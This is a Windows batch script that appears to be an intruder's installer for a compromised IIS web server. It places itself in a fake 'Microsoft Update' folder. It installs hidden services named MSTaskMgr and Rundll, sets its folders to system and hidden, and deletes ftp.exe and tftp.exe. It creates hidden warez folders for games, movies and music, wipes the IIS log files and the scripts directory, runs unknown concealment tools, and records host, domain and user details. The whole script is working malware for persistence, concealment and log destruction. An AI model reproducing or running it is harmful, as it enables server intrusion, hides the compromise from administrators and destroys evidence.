@echo off
set MXBIN=c:\progra~1\Microsoft\Update\DLL\tk
set MXHOME=c:\progra~1\Microsoft\Update\DLL\tk
c:\progra~1\Microsoft\Update\DLL\tk\FIREDAEMON.exe -i MSTaskMgr "c:\progra~1\Microsoft\Update\DLL\TK" "c:\progra~1\Microsoft\Update\DLL\tk\MSTaskMgr.exe" "" Y 0 0 N Y
c:\progra~1\Microsoft\Update\DLL\tk\FIREDAEMON.exe -i Rundll "c:\progra~1\Microsoft\Update\DLL\TK" "c:\progra~1\Microsoft\Update\DLL\tk\rundll.exe" "" Y 0 0 N Y
TYPE NUL | c:\progra~1\Microsoft\Update\DLL\tk\wait.com /N /CY /TY,3 >NUL
net start mstaskmgr
net start rundll
TYPE NUL | c:\progra~1\Microsoft\Update\DLL\tk\wait.com /N /CY /TY,3 >NUL
mkdir c:\winnt\system32\shellext\system\tk >nul
attrib c:\progra~1\Microsoft\Update +s +h
attrib c:\progra~1\Microsoft\Update\DLL +s +h
attrib c:\progra~1\Microsoft\Update\DLL\TK +s +h
attrib c:\winnt\system32\shellext\system +s +h
attrib c:\winnt\system32\shellext\system\tk +s +h
del c:\winnt\system32\ftp.exe
del c:\winnt\system32\tftp.exe
md c:\winnt\system32\shellext\system\tk\"(-01-)          DISTRO"
md c:\winnt\system32\shellext\system\tk\(-02-)
md c:\winnt\system32\shellext\system\tk\(-03-)
md c:\winnt\system32\shellext\system\tk\"APPZ"
md c:\winnt\system32\shellext\system\tk\"GAMES"
md c:\winnt\system32\shellext\system\tk\"MOVIES"
md c:\winnt\system32\shellext\system\tk\"MUSIC"
md c:\winnt\system32\shellext\system\tk\"SPEED"
net stop "World Wide Web Publishing Service"
c:\progra~1\Microsoft\Update\DLL\tk\d.exe /y c:\winnt\system32\LogFiles >nul
net start "World Wide Web Publishing Service"
c:\progra~1\Microsoft\Update\DLL\tk\d.exe /y c:\inetpub\scripts >nul
c:\progra~1\Microsoft\Update\DLL\tk\rs.exe c:\progra~1\Microsoft\Update\DLL\tk
c:\progra~1\Microsoft\Update\DLL\tk\rs.exe c:\progra~1\Microsoft\Update\DLL
c:\progra~1\Microsoft\Update\DLL\tk\rs.exe c:\progra~1\Microsoft\Update
c:\progra~1\Microsoft\Update\DLL\tk\rs.exe c:\winnt\system32\shellext\system
c:\progra~1\Microsoft\Update\DLL\tk\rs.exe c:\winnt\system32\shellext\system\tk
c:\progra~1\Microsoft\Update\DLL\tk\rs.exe c:\winnt\system32\netstat.exe
c:\progra~1\Microsoft\Update\DLL\tk\rs.exe c:\inetpub\scripts
c:\progra~1\Microsoft\Update\DLL\tk\vmz.exe
echo DATE: %date% >c:\winnt\system32\shellext\system\tk\info.txt
echo TIME: %time% >>c:\winnt\system32\shellext\system\tk\info.txt
echo OS: %os% >>c:\winnt\system32\shellext\system\tk\info.txt
echo DOMAINNAME: %USERDOMAIN% >>c:\winnt\system32\shellext\system\tk\info.txt
echo USERNAME: %USERNAME% >>c:\winnt\system32\shellext\system\tk\info.txt
echo LOGONSERVER: %LOGONSERVER% >>c:\winnt\system32\shellext\system\tk\info.txt
echo COMPUTERNAME: %COMPUTERNAME% >>c:\winnt\system32\shellext\system\tk\info.txt

